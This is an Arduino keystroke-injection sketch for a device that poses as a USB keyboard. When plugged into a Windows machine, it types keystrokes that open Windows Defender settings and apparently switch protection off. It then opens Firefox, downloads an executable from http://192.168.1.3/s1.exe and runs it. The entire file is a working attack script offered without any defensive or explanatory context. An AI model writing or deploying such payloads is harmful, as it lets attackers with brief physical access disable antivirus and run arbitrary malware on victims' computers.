#include <Keyboard.h>
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(6000);

  typeKey(KEY_LEFT_GUI);

  delay(400);

  Keyboard.println("Windows Defender Settings");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(250);
  typeKey(KEY_TAB);
  delay(250);
  typeKey(KEY_TAB);
  delay(250);
  typeKey(KEY_TAB);
  delay(250);
  typeKey(KEY_TAB);
  delay(250);
  typeKey(KEY_TAB);
  delay(250);

  typeKey(KEY_RETURN);

  delay(400);

  typeKey(' ');

  delay(1000);

  typeKey(KEY_LEFT_ARROW);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);

  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.println("firefox");

  delay(500);

  /*Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(108);
  Keyboard.releaseAll();*/
  delay(500);
  
  Keyboard.println("http://192.168.1.3/s1.exe");

  delay(3000);

  typeKey(KEY_LEFT_ARROW);

  delay(500);

  typeKey(KEY_RETURN);

  delay(2500);

  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(106);
  Keyboard.releaseAll();
  
  delay(500);

  typeKey(KEY_RETURN);

  delay(750);

  typeKey(KEY_LEFT_ARROW);

  delay(500);

  typeKey(KEY_RETURN);
  delay(2000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  
  
  


}


void loop() {

 
  // put your main code here, to run repeatedly:

}
